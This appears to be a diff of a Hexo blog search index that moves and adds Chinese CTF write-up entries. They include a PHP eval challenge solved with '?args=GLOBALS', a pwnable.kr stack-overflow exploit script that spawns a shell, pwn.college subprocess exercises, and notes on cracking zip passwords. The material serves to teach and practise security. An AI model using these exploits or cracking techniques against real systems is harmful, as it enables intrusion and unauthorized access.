@@ -588,65 +588,6 @@
       </tags>
   </entry>
   <entry>
-    <title>变量1（BUGKU）</title>
-    <url>/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/</url>
-    <content><![CDATA[<p>前言：php是一门非常好的语言^o^</p>
-<p>打开题目是一段代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w+$/&quot;</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>关注到三个点</p>
-<p>1、存在eval（<strong>eval类型函数是代码执行</strong>）</p>
-<p>2、存在”$$”即存在变量覆盖漏洞（猜测）</p>
-<p>3、var_dump()：这个函数可以输出数组（我认为这也可以算一个小小的提示）</p>
-<p>4、最后就是要理解这个正则表达式的意思了</p>
-<p>&#x2F;^\w+$&#x2F;：匹配所有非字母数字，即符号&#x3D;&#x3D;&#x3D;》将他带入条件中就是输入中不允许存在除数字字母外的东西</p>
-<p>一篇文章速成正则：<a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md#21-%E7%82%B9%E8%BF%90%E7%AE%97%E7%AC%A6-">learn-regex&#x2F;README-cn.md at master · ziishaned&#x2F;learn-regex · GitHub</a></p>
-<p>纯字母+$$所以可以使用$GLOBALS 来输出flag</p>
-<p>payload：?args&#x3D;GLOBALS</p>
-<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195653905.png" class="" title="image-20220704195653905">
-
-<h2 id="GET新知识点-php九大全局变量"><a href="#GET新知识点-php九大全局变量" class="headerlink" title="GET新知识点  php九大全局变量"></a>GET新知识点  php九大全局变量</h2><p>（借用此题顺便展示一下效果，方便理解）</p>
-<ul>
-<li><p>$_POST [用于接收post提交的数据]</p>
-</li>
-<li><p>$_GET [用于获取url地址栏的参数数据]</p>
-<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195403598.png" class="" title="image-20220704195403598">
-
-
-</li>
-<li><p>$_FILES [用于文件就收的处理img 最常见]</p>
-</li>
-<li><p>$_COOKIE [用于获取与setCookie()中的name 值]</p>
-<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195528785.png" class="" title="image-20220704195528785">
-
-
-</li>
-<li><p>$_SESSION [用于存储session的值或获取session中的值]</p>
-</li>
-<li><p>$_REQUEST [具有get,post的功能，但比较慢]</p>
-</li>
-<li><p>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</p>
-</li>
-<li><p>$GLOBALS [一个包含了全部变量的全局组合数组]</p>
-<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195847966.png" class="" title="image-20220704195847966">
-
-<p>效果如上</p>
-</li>
-<li><p>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>web题集</category>
-        <category>笔记</category>
-        <category>web笔记</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023楚慧杯初赛</title>
     <url>/2023/04/01/2023%E6%A5%9A%E6%85%A7%E6%9D%AFWP/</url>
     <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image002.gif" alt="图片"></p>
@@ -724,6 +665,65 @@
       <tags>
         <tag>misc</tag>
         <tag>re</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>变量1（BUGKU）</title>
+    <url>/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/</url>
+    <content><![CDATA[<p>前言：php是一门非常好的语言^o^</p>
+<p>打开题目是一段代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w+$/&quot;</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关注到三个点</p>
+<p>1、存在eval（<strong>eval类型函数是代码执行</strong>）</p>
+<p>2、存在”$$”即存在变量覆盖漏洞（猜测）</p>
+<p>3、var_dump()：这个函数可以输出数组（我认为这也可以算一个小小的提示）</p>
+<p>4、最后就是要理解这个正则表达式的意思了</p>
+<p>&#x2F;^\w+$&#x2F;：匹配所有非字母数字，即符号&#x3D;&#x3D;&#x3D;》将他带入条件中就是输入中不允许存在除数字字母外的东西</p>
+<p>一篇文章速成正则：<a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md#21-%E7%82%B9%E8%BF%90%E7%AE%97%E7%AC%A6-">learn-regex&#x2F;README-cn.md at master · ziishaned&#x2F;learn-regex · GitHub</a></p>
+<p>纯字母+$$所以可以使用$GLOBALS 来输出flag</p>
+<p>payload：?args&#x3D;GLOBALS</p>
+<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195653905.png" class="" title="image-20220704195653905">
+
+<h2 id="GET新知识点-php九大全局变量"><a href="#GET新知识点-php九大全局变量" class="headerlink" title="GET新知识点  php九大全局变量"></a>GET新知识点  php九大全局变量</h2><p>（借用此题顺便展示一下效果，方便理解）</p>
+<ul>
+<li><p>$_POST [用于接收post提交的数据]</p>
+</li>
+<li><p>$_GET [用于获取url地址栏的参数数据]</p>
+<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195403598.png" class="" title="image-20220704195403598">
+
+
+</li>
+<li><p>$_FILES [用于文件就收的处理img 最常见]</p>
+</li>
+<li><p>$_COOKIE [用于获取与setCookie()中的name 值]</p>
+<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195528785.png" class="" title="image-20220704195528785">
+
+
+</li>
+<li><p>$_SESSION [用于存储session的值或获取session中的值]</p>
+</li>
+<li><p>$_REQUEST [具有get,post的功能，但比较慢]</p>
+</li>
+<li><p>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</p>
+</li>
+<li><p>$GLOBALS [一个包含了全部变量的全局组合数组]</p>
+<img src="/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/image-20220704195847966.png" class="" title="image-20220704195847966">
+
+<p>效果如上</p>
+</li>
+<li><p>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>web题集</category>
+        <category>笔记</category>
+        <category>web笔记</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1021,28 +1021,6 @@
       </tags>
   </entry>
   <entry>
-    <title>bof</title>
-    <url>/2022/07/12/bof(wp)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
-<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
-
-<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwnable刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(NCTF2019)Fake XML cookbook</title>
     <url>/2022/07/02/%5BNCTF2019%5DFake%20XML%20cookbook/</url>
     <content><![CDATA[<p>点击进入题目是一个登陆界面</p>
@@ -1068,6 +1046,28 @@
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bof</title>
+    <url>/2022/07/12/bof(wp)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
+<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
+
+<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwnable刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1282,7 +1282,7 @@
       </tags>
   </entry>
   <entry>
-    <title>java反射机制</title>
+    <title>cc1</title>
     <url>/2023/04/24/cc1/</url>
     <content><![CDATA[<h1 id="TransformedMap版-CC1"><a href="#TransformedMap版-CC1" class="headerlink" title="TransformedMap版 CC1"></a>TransformedMap版 CC1</h1><h4 id="链子发现"><a href="#链子发现" class="headerlink" title="链子发现"></a>链子发现</h4><p>cc1的最终利用点就是<code>InvokerTransformer</code>中的transformer方法，接受一个Object对象，并通过反射的方式执行方法；</p>
 <p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420223801002.png" alt="image-20230420223801002"></p>
@@ -1454,33 +1454,6 @@
       </tags>
   </entry>
   <entry>
-    <title>embryoio level15~level28</title>
-    <url>/2022/06/22/embryoio%20level15~level28/</url>
-    <content><![CDATA[<h1 id="embryoio-level15-level21"><a href="#embryoio-level15-level21" class="headerlink" title="embryoio level15~level21"></a>embryoio level15~level21</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>学会编写python脚本运行程序</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><img src="/2022/06/22/embryoio%20level15~level28/image-20220622150316738.png" class="" title="image-20220622150316738">
-
-<p>根据上图可以知道程序需要一个名叫<code>ipython</code>的python脚本来运行程序，我尝试过在<code>challenge目录</code>下编写脚本但是权限不允许，所以就在用户根目录下创建<code>ipython.py</code>文件。</p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#=====================level15=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level15&quot;</span>])</span><br></pre></td></tr></table></figure>
-
-<p>运行后得到flag</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>其它题目的解题方法与之前的题目都大致一样，无非就是让python脚本来完成之前的操作，所以在此不过多赘述，直接放python代码。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#=====================level16=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level16&quot;</span>])		<span class="comment">#运行脚本后输入密码即可获得flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level17=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level16&quot;</span>， <span class="string">&quot;password&quot;</span>])		<span class="comment">#在password替换为需要外部输入的密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level18=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level18&quot;</span>],env=&#123;<span class="string">&#x27;environment&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)		<span class="comment">#替换未对应的环境变量即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level19=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;w&#x27;</span>)		<span class="comment">#fliename替换为对应的外部文件的文件名</span></span><br><span class="line">file.write(<span class="string">&#x27;password&#x27;</span>)					<span class="comment">#password替换为题目对应需要的密码</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level19&#x27;</span>], stdin=file)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level20=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;w&#x27;</span>)		<span class="comment">#fliename替换为对应的外部文件的文件名</span></span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level20&#x27;</span>], stdout=file)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level21=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level21&quot;</span>],env=&#123;&#125;)		<span class="comment">#设置一个空环境变量</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="embryoio-level22-level28"><a href="#embryoio-level22-level28" class="headerlink" title="embryoio level22~level28"></a>embryoio level22~level28</h1><p>这些题与上面一样，基本没什么区别，所以在此也不多赘述，可以参考以上的脚本。</p>
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwncollege刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP特性(web89~web97)</title>
     <url>/2022/07/14/ctfshow_web89~web97/</url>
     <content><![CDATA[<h2 id="web-89"><a href="#web-89" class="headerlink" title="web 89"></a>web 89</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1557,6 +1530,33 @@
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>embryoio level15~level28</title>
+    <url>/2022/06/22/embryoio%20level15~level28/</url>
+    <content><![CDATA[<h1 id="embryoio-level15-level21"><a href="#embryoio-level15-level21" class="headerlink" title="embryoio level15~level21"></a>embryoio level15~level21</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>学会编写python脚本运行程序</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><img src="/2022/06/22/embryoio%20level15~level28/image-20220622150316738.png" class="" title="image-20220622150316738">
+
+<p>根据上图可以知道程序需要一个名叫<code>ipython</code>的python脚本来运行程序，我尝试过在<code>challenge目录</code>下编写脚本但是权限不允许，所以就在用户根目录下创建<code>ipython.py</code>文件。</p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#=====================level15=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level15&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>运行后得到flag</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>其它题目的解题方法与之前的题目都大致一样，无非就是让python脚本来完成之前的操作，所以在此不过多赘述，直接放python代码。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#=====================level16=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level16&quot;</span>])		<span class="comment">#运行脚本后输入密码即可获得flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level17=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level16&quot;</span>， <span class="string">&quot;password&quot;</span>])		<span class="comment">#在password替换为需要外部输入的密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level18=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level18&quot;</span>],env=&#123;<span class="string">&#x27;environment&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)		<span class="comment">#替换未对应的环境变量即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level19=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;w&#x27;</span>)		<span class="comment">#fliename替换为对应的外部文件的文件名</span></span><br><span class="line">file.write(<span class="string">&#x27;password&#x27;</span>)					<span class="comment">#password替换为题目对应需要的密码</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level19&#x27;</span>], stdin=file)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level20=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;w&#x27;</span>)		<span class="comment">#fliename替换为对应的外部文件的文件名</span></span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level20&#x27;</span>], stdout=file)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level21=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level21&quot;</span>],env=&#123;&#125;)		<span class="comment">#设置一个空环境变量</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="embryoio-level22-level28"><a href="#embryoio-level22-level28" class="headerlink" title="embryoio level22~level28"></a>embryoio level22~level28</h1><p>这些题与上面一样，基本没什么区别，所以在此也不多赘述，可以参考以上的脚本。</p>
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwncollege刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1916,6 +1916,54 @@
       </tags>
   </entry>
   <entry>
+    <title>各种压缩包的加密</title>
+    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
+<p>第一个a.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
+
+<p>看了下有三个文件，1.txt，2.txt</p>
+<p>按照套路应该是CRC32爆破没错了，试试看</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
+
+<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
+<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
+<p>第二个f.zip</p>
+<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
+
+<p>五位数字爆破成功密码是61825</p>
+<p>第三个g.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
+
+<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
+<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
+
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
+
+<p>进行明文爆破，成功</p>
